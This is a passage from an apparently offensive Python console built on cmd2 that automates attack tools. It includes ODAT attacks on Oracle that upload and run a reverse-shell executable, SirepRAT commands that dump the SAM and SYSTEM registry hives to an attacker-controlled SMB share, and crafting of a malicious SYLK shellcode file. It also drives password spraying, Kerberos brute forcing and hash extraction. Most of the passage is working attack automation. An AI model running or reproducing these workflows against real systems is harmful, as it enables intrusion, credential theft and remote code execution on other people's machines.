            odat
        """
        rhost = self.params["rhost"]
        path = os.getcwd()
        exploit_dir = os.path.join(path, "external/.exploit")
        sessions_dir = os.path.join(path, "sessions")
        file_gz = "odat-linux-libc2.17-x86_64.tar.gz"
        odat_url = f"https://github.com/quentinhardy/odat/releases/download/5.1.1/odat-linux-libc2.17-x86_64.tar.gz"
        odat_dir = os.path.join(exploit_dir, "odat")
        odat_path = f"{odat_dir}/odat-libc2.17-x86_64/odat-libc2.17-x86_64"
        if not os.path.exists(odat_path):
            print_msg("Download from ODAT repository...")
            command = f"mkdir {odat_dir} && cd {odat_dir} && wget {odat_url} && tar -vzxf {file_gz} --strip-components=1 && chmod +x {odat_path}"
            print(command)
            self.cmd(command)
            print_msg("ODAT downloaded successfully.")
            print_msg("Running ODAT sidguesser...")
        else:
            print_msg("ODAT already downloaded, skipping download.")

        rhost = input(f"    {GREEN}[!] Enter the target RHOST (default {rhost}): ").strip() or rhost
        port = input(f"    [?] Enter the target port (default 1521): ").strip() or "1521"

        if not line:
            list_attacks = ["sidguesser", "passwordguesser", "utlfile", "externaltable"]
            print_msg("Select an attack: ")
            for i, attack in enumerate(list_attacks, 1):
                print_warn(f"{i}. {attack}")
        try:
            selected_attack = int(input(f"{GREEN}    [!] Enter yout choice (1-{len(list_attacks)}): "))
            if 1 <= selected_attack <= len(list_attacks):
                print_msg(f"Attack selected: {list_attacks[selected_attack - 1]}")
                line = list_attacks[selected_attack - 1]
            else:
                print_error(f"Wrong choice: {len(list_attacks)}.")
                return
        except ValueError:
            print_error("Enter a valid option.")
            return

        if line.startswith("sidguesser"):

            odat_command = f"cd {odat_dir}/odat-libc2.17-x86_64 && {odat_path} sidguesser -s {rhost} -p {port}"
            print_msg(f"Running ODAT SID guessing on {rhost}:{port}... {odat_command}")

            self.cmd(odat_command)

        elif line.startswith("passwordguesser"):
            SID = input("    [!] Enter valid SID: ")
            odat_command = f"cd {odat_dir}/odat-libc2.17-x86_64 && {odat_path} passwordguesser -s {rhost} -p {port} -d {SID} --accounts-file accounts/accounts.txt"
            print_msg(f"Running ODAT SID guessing on {rhost}:{port}... {odat_command}")

            self.cmd(odat_command)

        elif line.startswith("utlfile"):
            if os.path.exists(os.path.join(sessions_dir, 'shell64.exe')):
                if os.path.exists(os.path.join(sessions_dir, 'credentials.txt')):
                    credentials = get_credentials()
                    if not credentials:
                        return

                    for user, passwd in credentials:
                        password = passwd
                        username = user
                    SID = input("    [!] Enter valid SID: ")
                    odat_command = f"cd {sessions_dir} && {odat_path} utlfile -s {rhost} -p {port} -U {username} -P {password} -d {SID} --sysdba --putFile /temp shell64.exe shell64.exe"
                    print_msg(f"Running ODAT SID guessing on {rhost}:{port}... {odat_command}")

                    self.cmd(odat_command)
                else:
                    print_error(f"Credentials must be assign, use: {GREEN}createcredentials admin:admin")
            else:
                print_error(f"Shell64.exe not found, use: {GREEN}venom")

        elif line.startswith("externaltable"):

            if os.path.exists(os.path.join(sessions_dir, 'credentials.txt')):
                credentials = get_credentials()
                if not credentials:
                    return

                for user, passwd in credentials:
                    password = passwd
                    username = user
                SID = input("    [!] Enter valid SID: ")
                odat_command = f"{odat_path} externaltable -s {rhost} -p {port} -U {username} -P {password} -d {SID} --sysdba --exec /temp shell64.exe"
                print_msg(f"Running ODAT SID guessing on {rhost}:{port}... {odat_command}")
                input(f"Press enter to execute, rember metasploit handdler must be listening, use in another terminal:{GREEN} msf rev win64 {RESET}")
                self.cmd(odat_command)
            else:
                print_error(f"Credentials must be assign, use: {GREEN}createcredentials admin:admin")
        else:
            print_error("Wrong choice")
        print_msg(f"Odat command executed: odat_command")
        return

    @cmd2.with_category(exploitation_category)
    def do_sireprat(self, line):
        """
        Command sireprat: Automates the setup and usage of SirepRAT to perform various attacks on a Windows IoT Core device.

        This function performs the following tasks:
        1. Installs required dependencies and sets up SirepRAT if not already installed.
        2. Prompts the user to select from predefined attacks, including retrieving system information, executing commands, saving registry keys, and copying files.
        3. Executes the selected attack on the target device, using the remote host IP stored in self.params["rhost"].

        Args:
            line (str): Optional argument for specifying attack type directly.

        Returns:
            None

        Example:
            sireprat
        """
        rhost = self.params["rhost"]
        lhost = self.params["lhost"]
        sireprat_repo = "https://github.com/SafeBreach-Labs/SirepRAT.git"
        sireprat_dir = os.path.join(os.getcwd(), "external/.exploit/SirepRAT")
        sessions = os.path.join(os.getcwd(), "sessions")
        if not os.path.exists(sireprat_dir):
            print_msg("Cloning SirepRAT repository...")
            self.cmd(f"git clone {sireprat_repo} {sireprat_dir}")
            print_msg("Installing SirepRAT requirements...")
            self.cmd(f"pip3 install -r {sireprat_dir}/requirements.txt")
        else:
            print_msg("SirepRAT already installed, skipping setup.")

        choice = input("    [!] do you wanna config smb service ? its necesary to perform the attack. (y/n): ") or 'n'
        if choice == "y":
            smb_file = "/etc/samba/smb.conf"
            smb_conf = """
            [Public]
            path = /tmp/Public
            writable = yes
            guest ok = yes
            guest only = yes
            create mode = 0777
            directory mode = 077
            force user = nobody
            """.replace("            ","")
            copy2clip(smb_conf)
            command = "mkdir /tmp/Public && chmod 777 /tmp/Public"
            print_msg(command)
            self.cmd(command)
            print_msg(f"opening sudo nano {smb_file} -l use Shift + Ctrl + V to paste smb.conf content.")
            input("Press enter to continue. ")
            self.cmd(f"sudo nano {smb_file} -l")
            self.cmd("service smbd restart")

        attack_list = [
            "GetSystemInformationFromDevice",
            "GetFileInformationFromDevice --remote_path \"C:\\Windows\\System32\\ntoskrnl.exe\"",
            "LaunchCommandWithOutput --return_output --cmd \"C:\\Windows\\System32\\cmd.exe\" --args \" /c echo {{userprofile}}\"",
            "LaunchCommandWithOutput --return_output --cmd \"C:\\Windows\\System32\\cmd.exe\" --args \" /c reg save HKLM\\SYSTEM C:\\SYSTEM\"",
            "LaunchCommandWithOutput --return_output --cmd \"C:\\Windows\\System32\\cmd.exe\" --args \" /c reg save HKLM\\SAM C:\\SAM\"",
            f"LaunchCommandWithOutput --return_output --cmd \"C:\\Windows\\System32\\cmd.exe\" --args \" /c copy C:\\SYSTEM \\\\\\\\{lhost}\\\\Public\\\\SYSTEM\"",
            f"LaunchCommandWithOutput --return_output --cmd \"C:\\Windows\\System32\\cmd.exe\" --args \" /c copy C:\\SAM \\\\\\\\{lhost}\\\\Public\\\\SAM\""
        ]

        if not line:
            print_msg("Select an attack:")
            print_warn("0. all")
            for i, attack in enumerate(attack_list, 1):
                print_warn(f"{i}. {attack}")

            try:
                selected_attack = int(input(f"    [!] Enter your choice (0-{len(attack_list)}): "))
                if selected_attack == 0:
                    print_msg("Executing all attacks sequentially...")
                    for attack in attack_list:
                        sireprat_command = f"python3 {sireprat_dir}/SirepRAT.py {rhost} {attack}"
                        print_msg(f"Running SirepRAT attack: {sireprat_command}")
                        self.cmd(sireprat_command)
                        print_msg(f"Sleeping 1 sec to continue to the next attack...")
                        time.sleep(1)
                    print_msg(f"cp /tmp/Public/* {sessions}")
                    self.cmd(f"cp /tmp/Public/* {sessions}")

                elif 1 <= selected_attack <= len(attack_list):
                    line = attack_list[selected_attack - 1]
                else:
                    print_error(f"Invalid choice: {len(attack_list)}.")
                    return
            except ValueError:
                print_error("Enter a valid option.")
                return
            sireprat_command = f"python3 {sireprat_dir}/SirepRAT.py {rhost} {line}"

        elif line == "all":
            print_msg("Executing all attacks sequentially...")
            for attack in attack_list:
                sireprat_command = f"python3 {sireprat_dir}/SirepRAT.py {rhost} {attack}"
                print_msg(f"Running SirepRAT attack: {sireprat_command}")
                self.cmd(sireprat_command)
                print_msg(f"Sleeping 1 sec to continue to the next attack...")
                time.sleep(1)
            print_msg(f"cp /tmp/Public/* {sessions}")
            self.cmd(f"cp /tmp/Public/* {sessions}")
            return

        else:
            sireprat_command = f"python3 {sireprat_dir}/SirepRAT.py {rhost} LaunchCommandWithOutput --return_output --cmd \"C:\\Windows\\System32\\cmd.exe\" --args \" /c {line}\""

        print_msg(f"Running SirepRAT attack: {sireprat_command}")
        self.cmd(sireprat_command)
        return

    @cmd2.with_category(reporting_category)
    def do_createtargets(self, line):
        """
        Generates hosts.txt, urls.txt, domains.txt, and targets.txt from multiple JSON payload files.

        This function scans the current directory for all JSON files with the format 'payload_{variable}.json',
        and extracts the 'rhost', 'url', 'domain', and 'subdomain' fields from each file. It then writes these values into
        four separate text files: 'hosts.txt', 'urls.txt', 'domains.txt', and 'targets.txt'. The 'targets.txt' file contains
        the domain and subdomain in the format '{subdomain}.{domain}' and '{subdomain}.{url}', with domains cleaned using
        the 'get_domain' function.

        Parameters:
        line (str): An optional argument (unused in this function).

        Returns:
        None
        """

        json_files = glob.glob("payload_*.json")

        hosts = []
        urls = []
        domains = []
        targets = []

        for json_file in json_files:
            try:
                with open(json_file, 'r') as f:
                    data = json.load(f)
                    rhost = data['rhost']
                    url = data['url']
                    domain = data['domain']
                    subdomain = data['subdomain']
                    cleaned_domain = get_domain(domain)
                    cleaned_url = get_domain(url)
                    hosts.append(rhost)
                    urls.append(url)
                    domains.append(domain)
                    targets.append(f"{domain}")
                    targets.append(f"{cleaned_url}")
                    targets.append(f"{subdomain}.{domain}")
                    targets.append(f"{subdomain}.{cleaned_url}")

            except FileNotFoundError:
                print_error(f"Error: {json_file} not found")
            except KeyError as e:
                print_error(f"Missing key {e} in {json_file}")

        with open('sessions/hosts.txt', 'w') as hosts_file:
            hosts_file.write("\n".join(hosts))

        with open('sessions/urls.txt', 'w') as urls_file:
            urls_file.write("\n".join(urls))

        with open('sessions/domains.txt', 'w') as domains_file:
            domains_file.write("\n".join(domains))

        with open('sessions/targets.txt', 'w') as targets_file:
            targets_file.write("\n".join(targets))
        command = f"sort sessions/targets.txt | uniq > sessions/targets_clean.txt"
        print_msg(command)
        self.cmd(command)
        print_msg("Files hosts.txt, urls.txt, domains.txt, and targets.txt have been generated.")
        return

    @cmd2.with_category(post_exploitation_category)
    def do_shellcode2sylk(self, line):
        """
        Converts shellcode to SYLK format and saves the result to a file.

        This function reads the provided shellcode, or retrieves it from a default
        binary source if not supplied. The shellcode is then converted to SYLK
        format and saved in the `sessions/shellcode.sylk` file.

        PoC Python code to create a SYLK file with Excel4 shellcode loader.

        Author: Stan Hegt (@StanHacked)

        Just a proof of concept. Needs polishing before use in actual operations.
        Or as Adam Chester would put it: "RWX for this POC, because... yolo"

        Background details: https://outflank.nl/blog/2019/10/30/abusing-the-sylk-file-format/

        Args:
            line (str): The input shellcode string. If empty or None, the function
                        attempts to load shellcode from a predefined source.

        Returns:
            None: The function writes the SYLK shellcode to a file and prints it
            out, but does not return any value.

        Raises:
            FileNotFoundError: If no shellcode is found when trying to load it from
                            the default source.
        """
        shellcode_file = 'sessions/shellcode.sylk'
        if not line:
            line = get_users_dic("bin")
            if line == None:
                print_error("Error: No shellcodes found! use venom to create a shellcode.bin")
                return
        shellcode = shellcode_to_sylk(line.strip())
        choice = input("    [?] do you wanna see the payload ? (y/n)") or "n"
        if choice == "y":
            print_msg(shellcode)
        print_msg("Crafting the malicious payload file sylk with shellcode inside.")
        with open(shellcode_file, 'w') as targets_file:
            targets_file.write(shellcode)
        return

    @cmd2.with_category(scanning_category)
    def do_magicrecon(self, line):
        """
        Command magicrecon: Automates the setup and usage of MagicRecon to perform various types of reconnaissance and vulnerability scanning on specified targets.

        This function performs the following tasks:
        1. Clones and installs MagicRecon if not already installed.
        2. Prompts the user to input the target domain, list, or wildcard if not provided.
        3. Executes MagicRecon with the specified options for target reconnaissance and vulnerability analysis.
        4. Supports notifications through Discord, Telegram, or Slack if configured.

        Args:
            line (str): Command-line arguments specifying the target and recon mode. If not provided, the function prompts the user for required inputs.

        Returns:
            None

        Example:
            magicrecon -d example.com -a
        """

        magicrecon_repo = "https://github.com/robotshell/magicRecon.git"
        magicrecon_dir = os.path.join(os.getcwd(), "external/.exploit/magicRecon")

        url = self.params["url"]
        url = get_domain(url)

        if not os.path.exists(magicrecon_dir):
            print_msg("Cloning MagicRecon repository...")
            self.cmd(f"git clone {magicrecon_repo} {magicrecon_dir}")
            print_msg("Installing MagicRecon...")
            self.cmd(f"chmod +x {magicrecon_dir}/install.sh && {magicrecon_dir}/install.sh")
        else:
            print_msg("MagicRecon already installed, skipping setup.")

        args = line.split()

        if not args:
            print_msg("No arguments provided. Please specify target options.")
            target = input(f"Enter target domain default {url}: ").strip() or url
            mode = input("Enter mode option (-a, -p, -x, -r, -v, -m): ").strip() or "-a"
            notification = input("Enable notifications via Discord, Telegram, or Slack? (yes/no): ").strip().lower() or 'no'

            if notification == "yes":
                notify = "-n"
            else:
                notify = ""

            cmd = f"cd sessions && {magicrecon_dir}/magicrecon.sh -d {target} {mode} {notify}"
        else:
            cmd = f"cd sessions && {magicrecon_dir}/magicrecon.sh {' '.join(args)}"

        print_msg(f"Running MagicRecon command: {cmd}")
        self.cmd(cmd)
        return

    @cmd2.with_category(credential_access_category)
    def do_cubespraying(self, line):
        """
        Command cubespraying: Automates the installation and usage of CubeSpraying for performing credential spraying attacks.

        This function performs the following tasks:
        1. Clones and installs CubeSpraying if not already installed.
        2. Prompts the user for the target URL, username file, password file, and optional parameters like verbosity and timeout.
        3. Executes CubeSpraying for credential spraying attacks against the target URL.

        Args:
            line (str): Optional argument for specifying the target URL, username file, password file, and additional CubeSpraying options.

        Returns:
            None

        Example:
            cubespraying --url http://example.com --usernames users.txt --passwords passwords.txt --verbose --timeout 5
        """

        cubespraying_repo = "https://github.com/robotshell/cubeSpraying.git"
        cubespraying_dir = os.path.join(os.getcwd(), "external/.exploit/cubeSpraying")
        url = self.params["url"]
        wordlist = self.params["wordlist"]
        if not os.path.exists(cubespraying_dir):
            print_msg("Cloning CubeSpraying repository...")
            self.cmd(f"git clone {cubespraying_repo} {cubespraying_dir}")
            print_msg("Installing required dependencies...")
            self.cmd(f"pip3 install requests")
        else:
            print_msg("CubeSpraying already installed, skipping setup.")
        print_msg("Choice the usernames diccionary")
        self.onecmd("smalldic")
        users = get_users_dic()
        password = get_users_dic()
        if not line:
            url = input(f"    [!] Enter the target URL (default {url} ): ").strip() or url
            usernames = input(f"    [?] Enter the path to the usernames file (default {users}): ").strip() or users
            passwords = input(f"    [?] Enter the path to the passwords file (default {password}): ").strip() or password
            verbose = input("    [?] Enable verbose mode? (yes/no, default 'no'): ").strip().lower() or "no"
            timeout = input("    [?] Set timeout (in seconds, default 10): ").strip() or "10"
        else:
            args = line.split()
            url = args[0] if len(args) > 0 else url
            usernames = args[1] if len(args) > 1 else users
            passwords = args[2] if len(args) > 2 else wordlist
            verbose = "yes" if "--verbose" in args else "no"
            timeout = args[args.index("--timeout") + 1] if "--timeout" in args else "10"

        if not url or not usernames or not passwords:
            print_warn("Missing required arguments (URL, usernames, or passwords). Aborting...")
            return

        verbose_option = "--verbose" if verbose == "yes" else ""
        timeout_option = f"--timeout {timeout}"

        command = f"python3 {cubespraying_dir}/cubeSpraying.py --url {url} --usernames {usernames} --passwords {passwords} {verbose_option} {timeout_option}"

        print_msg(f"Running CubeSpraying attack: {command}")
        self.cmd(command)
        return

    @cmd2.with_category(exfiltration_category)
    def do_samdump2(self, line):
        """Run samdump2 with the SAM and SYSTEM file

        :param line: This parameter is not used in the function but can be reserved for future use.

        :returns: None

        Manual execution:
        To manually run `samdump2`, use the following command:

            samdump2 sessions/SYSTEM sessions/SAM

        This function prompts the user for domain, username, password, and IP address.
        """
        rhost = self.params["rhost"]
        if not is_binary_present("samdump2"):
            print_warn("samdump2 is not installed. Installing dependencies.")
            self.cmd("apt-get install samdump2 -y")


        if os.path.exists("sessions/SYSTEM"):
            output_file =  f"sessions/samdump_{rhost}.txt"
            command = f"samdump2 sessions/SYSTEM sessions/SAM -o {output_file}"
            print_msg(f"Executing command: {command}")
            self.cmd(command)
            self.cmd(f"cat {output_file}")
            self.logcsv(f"samdump2 {command}")
            return
        else:
            print_error("You need credentials.txt or SAM and SYSTEM files")

        return

    @cmd2.with_category(lateral_movement_category)
    def do_stormbreaker(self, line):
        """
        Command stormbreaker: Automates the installation and usage of Storm-Breaker for performing various network attacks.

        This function performs the following tasks:
        1. Clones and installs Storm-Breaker if not already installed.
        2. Prompts the user for optional parameters and target configuration.
        3. Executes Storm-Breaker to perform various attacks using the target configuration.

        Args:
            line (str): Optional argument for specifying additional Storm-Breaker options.

        Returns:
            None

        Example:
            stormbreaker --verbose
        """

        stormbreaker_repo = "https://github.com/ultrasecurity/Storm-Breaker"
        stormbreaker_dir = os.path.join(os.getcwd(), "external/.exploit/Storm-Breaker")

        if not os.path.exists(stormbreaker_dir):
            print_msg("Cloning Storm-Breaker repository...")
            self.cmd(f"git clone {stormbreaker_repo} {stormbreaker_dir}")
            print_msg("Running installation script...")
            self.cmd(f"cd {stormbreaker_dir} && sudo bash install.sh")
            print_msg("Installing required Python dependencies...")
            self.cmd(f"sudo python3 -m pip3 install -r {stormbreaker_dir}/requirements.txt")
        else:
            print_msg("Storm-Breaker is already installed, skipping setup.")

        if not line:
            verbose = input("    [?] Enable verbose mode? (yes/no, default 'no'): ").strip().lower() or "no"
        else:
            args = line.split()
            verbose = "yes" if "--verbose" in args else "no"

        verbose_option = "--verbose" if verbose == "yes" else ""
        command = f"cd {stormbreaker_dir} && sudo python3 st.py {verbose_option}"

        print_msg(f"Running Storm-Breaker: {command} you can run:{GREEN} ngrok 2525{RESET}")
        self.cmd(command)
        return

    @cmd2.with_category(exploitation_category)
    def do_upload_bypass(self, line):
        """
        Command upload_bypass: Automates the installation and execution of Upload_Bypass for performing file upload bypass tests.

        This function performs the following tasks:
        1. Clones and installs Upload_Bypass if not already installed.
        2. Prompts the user for the type of execution mode (Detection, Exploitation, or Anti-Malware).
        3. Prepares and executes the chosen mode based on user input: success message, forbidden extension, upload directory, and proxy settings.

        Args:
            line (str): Optional argument for specifying execution mode, request file, success message, forbidden extension, and other Upload_Bypass options.

        Returns:
            None

        Example:
            upload_bypass --detect --request_file test --success 'File uploaded successfully' --extension php --upload_dir /uploads --burp
        """

        upload_bypass_repo = "https://github.com/sAjibuu/Upload_Bypass.git"
        upload_bypass_dir = os.path.join(os.getcwd(), "external/.exploit/Upload_Bypass")

        if not os.path.exists(upload_bypass_dir):
            print_msg("Cloning Upload_Bypass repository...")
            self.cmd(f"git clone {upload_bypass_repo} {upload_bypass_dir}")
            print_msg("Installing required dependencies...")
            self.cmd(f"pip3 install -r {upload_bypass_dir}/requirements.txt")
        else:
            print_msg("Upload_Bypass already installed, skipping setup.")

        print_msg("Choose execution mode:")
        print_warn("1. Detection mode")
        print_warn("2. Exploitation mode")
        print_warn("3. Anti-Malware mode")

        mode_choice = input("Enter the number of the mode you want to use: ").strip()
        if mode_choice == "1":
            mode = "--detect"
        elif mode_choice == "2":
            mode = "--exploit"
        elif mode_choice == "3":
            mode = "--anti_malware"
        else:
            print_warn("Invalid mode choice. Aborting...")
            return

        request_file = get_users_dic()
        success_message = input(f"    [?] Enter the success message for a file upload (default ''): ").strip() or ''
        forbidden_extension = input(f"    [?] Enter the forbidden extension to test (default 'php'): ").strip() or 'php'
        upload_dir = input(f"    [?] Enter the remote upload directory (default '/uploads'): ").strip() or '/uploads'

        proxy_choice = input(f"    [?] Use Burp Suite proxy? (yes/no, default 'no'): ").strip().lower() or 'no'
        proxy_option = "--burp_http" if proxy_choice == "yes" else ""

        command = f"cd {upload_bypass_dir} && python3 {upload_bypass_dir}/upload_bypass.py -r {request_file} -s '{success_message}' -E {forbidden_extension} -D {upload_dir} {proxy_option} {mode} --insecure"

        print_msg(f"Running Upload_Bypass with command: {command}")
        self.cmd(command)
        return

    @cmd2.with_category(miscellaneous_category)
    def do_hex_to_plaintext(self, line):
        """
        Converts hexadecimal data from a file to plain text.

        Opens a text editor for the user to paste hexadecimal data into a file.
        Then reads the file, processes the hexadecimal data, and writes the plain text to a new file.

        Args:
            line (str): Name of the file containing hexadecimal data (without extension).
                        Defaults to 'request.txt' if not provided.

        Returns:
            None
        """
        if not line:
            line = "request.txt"
        line = line.strip()
        file_request = f"sessions/{line}"

        self.cmd(f"nano {file_request}")

        with open(file_request, 'r') as file:
            hex_data = file.read()

        lines = hex_data.splitlines()
        hex_values = []

        for line in lines:
            parts = line.split()
            hex_values.extend(parts[1:])
        hex_values = [byte for byte in hex_values if len(byte) == 2]

        plaintext = ''.join(chr(int(byte, 16)) for byte in hex_values if all(c in '0123456789abcdefABCDEF' for c in byte))

        print_msg("Plain text:")
        file_plain = "sessions/request_plaintext.txt"
        with open(file_plain, 'w') as plain:
            plain.write(plaintext)

        print_msg(plaintext)
        return

    @cmd2.with_category(scanning_category)
    def do_rpcmap_py(self, line):
        """
        Command rpcmap_py: Executes rpcmap.py commands to enumerate MSRPC interfaces.

        This function allows the user to:
        1. Run rpcmap.py with a specified string binding to discover MSRPC interfaces.
        2. Filter the output using grep for specific DCOM-related interfaces.
        3. Optionally run rpcmap.py with additional flags for brute-forcing opnums and adjusting the authentication level.

        Args:
            line (str): Optional argument specifying the string binding or additional flags for rpcmap.py.

        Returns:
            None

        Example:
            rpcmap_py 'ncacn_ip_tcp:10.10.10.213'
            rpcmap_py 'ncacn_ip_tcp:10.10.10.213' -brute-opnums -auth-level 1 -opnum-max 5
        """
        path = os.getcwd()
        rhost = self.params["rhost"]

        if not is_binary_present("rpcmap.py"):
            print_warn("rpcmap.py not found installing...")
            self.cmd("sudo apt install impacket -y")

        if not line:
            command = f"rpcmap.py 'ncacn_ip_tcp:{rhost}'"
            print_msg(f"Try... {command}")
            self.cmd(command)
            command= f"rpcmap.py 'ncacn_ip_tcp:{rhost}' | grep -A2 'DCOM'"
            print_msg(f"Try... {command}")
            self.cmd(command)
        else:
            if line.startswith("brute"):
                command = f"rpcmap.py 'ncacn_ip_tcp:{rhost}' -brute-opnums -auth-level 1 -opnum-max 5"
                print_msg(f"Try... {command}")
                self.cmd(command)


        print_msg(f"Running RPCMap command: {command}")
        return

    @cmd2.with_category(recon_category)
    def do_serveralive2(self, line):
        """
        Command serveralive2: Uses Impacket to connect to a remote MSRPC interface and retrieves the server bindings.

        This function allows the user to:
        1. Establish a connection to a remote MSRPC interface using a specified target from self.params["rhost"].
        2. Set the authentication level to none.
        3. Retrieve and print the network addresses from the server bindings using the IObjectExporter.

        Args:
            line (str): Unused in this context. The target is derived from self.params["rhost"].

        Returns:
            None

        Example:
            serveralive2
        """

        target = f"ncacn_ip_tcp:{self.params['rhost']}"
        rpcTransport = transport.DCERPCTransportFactory(target)
        portmap = rpcTransport.get_dce_rpc()
        portmap.set_auth_level(RPC_C_AUTHN_LEVEL_NONE)
        portmap.connect()

        obj = IObjectExporter(portmap)
        bindings = obj.ServerAlive2()

        for binding in bindings:
            addr = binding['aNetworkAddr']
            print_msg(f"Address: {addr}")
        return

    @cmd2.with_category(credential_access_category)
    def do_john2zip(self, line):
        """
        List all .zip files in the 'sessions' directory, let the user select one, and run the command
        `zip2john {selected_file} > sessions/hash.txt`.
        Then, run John the Ripper to crack the hash using the RockYou wordlist with multiple forks.

        Parameters:
        line (str): An optional string parameter. This can be used for any additional input, though
                    it's not needed in this specific command.

        Returns:
        None
        """
        sessions_dir = 'sessions'
        path = os.getcwd()
        output_dir = f"{path}/{sessions_dir}/"
        zip_files = get_users_dic("zip")

        if not is_binary_present("zip2john"):
            print_warn("zip2john not found installing...")
            self.cmd("sudo apt install zip2john -y")

        if not zip_files:
            print_error("No .zip files found in the 'sessions' directory.")
            return

        selected_file = zip_files

        selected_file_path = os.path.join(sessions_dir, selected_file)

        hash_file_path = os.path.join(sessions_dir, 'hash.txt')

        if os.path.exists(hash_file_path):
            timestamp = time.strftime("%Y%m%d-%H%M%S")
            backup_hash_file = os.path.join(sessions_dir, f"hash_{timestamp}.txt")
            os.rename(hash_file_path, backup_hash_file)
            print_warn(f"Existing hash.txt file backed up as: {backup_hash_file}")

        command = f"sudo zip2john {selected_file_path} > {hash_file_path}"
        try:
            print_msg(command)
            self.cmd(command)
            print_msg(f"Hash saved in: {hash_file_path}")
        except Exception as e:
            print_error(f"Error executing command: {str(e)}")
            return

        wordlist_path = "/usr/share/wordlists/rockyou.txt"
        john_command = f"sudo john {hash_file_path} -w={wordlist_path} --fork=4"
        try:
            print_msg(john_command)
            self.cmd(john_command)
            password = input("    [!] Enter the password cracked(default: admin): ") or "admin"
            command = f"unzip -P {password} {selected_file_path} -d {output_dir}"
            print_msg(command)
            self.cmd(command)

        except Exception as e:
            print_error(f"Error executing John the Ripper: {str(e)}")

    @cmd2.with_category(credential_access_category)
    def do_createusers_and_hashs(self, line):
        """
        Command createusers_and_hashs: Extracts usernames and hashes from a dump file.

        This function opens a nano editor for the user to input the contents of a
        file in the format:

            username:UID:LM_HASH:NT_HASH:::

        Once the data is entered and saved, the function generates:
        1. A file named `usernames_{rhost}.txt` containing all usernames.
        2. Individual files named `hash_{username}.txt` for each user, containing
        the user's LM and NT hash in the format `LM_HASH:NT_HASH`.

        Args:
            line (str): Unused parameter, kept for consistency.

        Returns:
            None
        """
        rhost = self.params["rhost"]
        domain = get_domain(self.params["url"])
        path = os.getcwd()
        sessions= f"{path}/sessions"
        dump_file = f"{sessions}/dump.txt"
        self.cmd(f"nano {dump_file}")

        usernames_file = f"{sessions}/usernames_{domain}.txt"
        with open(dump_file, "r") as dump, open(usernames_file, "w") as users:
            for line in dump:
                try:
                    username, _, lm_hash, nt_hash, *_ = line.strip().split(":")
                    users.write(f"{username}\n")
                    with open(f"{sessions}/hash_{username}.txt", "w") as hash_file:
                        hash_file.write(f"{lm_hash}:{nt_hash}")
                except ValueError:
                    continue

        print_msg(f"Usernames saved to {usernames_file}")
        print_msg("Hashes saved in individual files per user.")
        return

    @cmd2.with_category(scanning_category)
    def do_pykerbrute(self, line):
        """
        Command pykerbrute: Automates the installation and execution of PyKerbrute for bruteforcing Active Directory accounts using Kerberos pre-authentication.

        This function performs the following tasks:
        1. Clones and installs PyKerbrute if not already installed.
        2. Allows the user to choose between the EnumADUser.py and ADPwdSpray.py scripts.
        3. Executes the selected script with user-defined parameters, including domain, mode (TCP/UDP), and selected hash or password.

        Args:
            line (str): Optional argument for specifying additional parameters for execution, such as domain controller, domain, and attack mode.

        Returns:
            None
        """

        pykerbrute_repo = "https://github.com/grisuno/pyKerbrute.git"
        pykerbrute_dir = os.path.join(os.getcwd(), "external/.exploit/pyKerbrute")
        export = f" export PYTHONPATH=$PYTHONPATH:{pykerbrute_dir}/_crypto:{pykerbrute_dir}/pyasn1 && "
        if not os.path.exists(pykerbrute_dir):
            print_msg("Cloning PyKerbrute repository...")
            self.cmd(f"git clone {pykerbrute_repo} {pykerbrute_dir}")
            print_msg("Installing required dependencies...")
            self.cmd(f"cd {pykerbrute_dir} && chmod +x {pykerbrute_dir}/install.sh && {pykerbrute_dir}/install.sh")
            self.cmd("sudo apt-get install python2.7 python2.7-dev")
        else:
            print_msg("PyKerbrute already installed, skipping setup.")

        print_msg("Choose the PyKerbrute attack mode:")
        print_warn("1. Enumerate valid Active Directory accounts (EnumADUser.py)")
        print_warn("2. Password spray (ADPwdSpray.py)")

        attack_choice = input("Enter the number of the attack mode you want to use: ").strip()

        if attack_choice == "1":
            script = "EnumADUser.py"
        elif attack_choice == "2":
            script = "ADPwdSpray.py"
        else:
            print_warn("Invalid choice. Aborting...")
            return
        rhost = self.params["rhost"]
        domain = self.params["domain"]
        subdomain = self.params["subdomain"]
        users_file = 'henry.vinson'
        domain_controller = input(f"    [?] Enter the Domain Controller address (default '{subdomain}'): ").strip() or subdomain
        domain = input(f"    [?] Enter the domain name (default '{domain}'): ").strip() or domain
        user_file = input(f"    [?] Enter the username (default '{users_file}'): ").strip() or users_file

        if script == "ADPwdSpray.py":
            password_data = get_hash(True)
            if not password_data:
                print_error("No password hash selected. Exiting.")
                return
            command = f"cd sessions && {export} python2 {pykerbrute_dir}/{script} {domain_controller} {domain} {user_file} {password_data} "
        else:
            user_file = get_users_dic()
            mode_choice = input("    [!] Enter mode: (tcp/udp): ") or 'tcp'
            command = f"cd sessions && {export} python2 {pykerbrute_dir}/{script} {domain_controller} {domain} {user_file} {mode_choice}"

        print_msg(f"Executing: {command}")
        self.cmd(command)
        return

    @cmd2.with_category(exfiltration_category)
    def do_reg_py(self, line):
        """Run reg.py with specified parameters to query the registry.

        :param line: Line input for any additional parameters.

        :returns: None

        Manual execution:
        To manually run `reg.py`, use the following command:

            reg.py -hashes :<hash> <domain>/<username>@<target> query -keyName <registry_key>

        This function prompts the user for the hash, domain, username, and registry key if they are not already provided.
        """
        subdomain = self.params["subdomain"]
        domain = self.params["domain"]
        if not is_binary_present("reg.py"):
            print_warn("reg.py is not installed. Installing.")
            self.cmd("sudo apt install impacket -y")
            return

        hash_value = get_hash()
        domain = input(f"Enter domain (e.g., {domain}): ") or domain
        subdomain = input(f"Enter dc domain (e.g., {subdomain}): ") or subdomain
        username = input("Enter username (e.g., henry.vinson): ") or 'henry.vinson'
        key_name = input("Enter registry key (e.g., HKU\\\\Software): ") or 'HKU\\\\Software'

        command = f"reg.py -hashes {hash_value} {domain}/{username}@{subdomain} query -keyName {key_name}"

        print_msg(f"Executing command: {command}")
        self.cmd(command)
        command = f"impacket-reg -hashes {hash_value} {domain}/{username}@{subdomain} query -keyName {key_name}"

        print_msg(f"Executing command: {command}")
        self.cmd(command)

        return

    @cmd2.with_category(reporting_category)
    def do_name_the_hash(self, line):
        """Identify hash type using nth after retrieving it with get_hash().

        :param line: Line input for any additional parameters.

        :returns: None

        Manual execution:
        To manually identify the hash, use the following command:

            nth -t "{hash}"

        This function fetches the hash using get_hash() and identifies its type. If nth is not installed, it is automatically installed.
        """
        if not is_binary_present("nth"):
            print_warn("nth is not installed. Installing.")
            self.cmd("pip3 install nth")
            return

        hash_file_path = 'sessions/hash.txt'

        if not os.path.exists(hash_file_path):
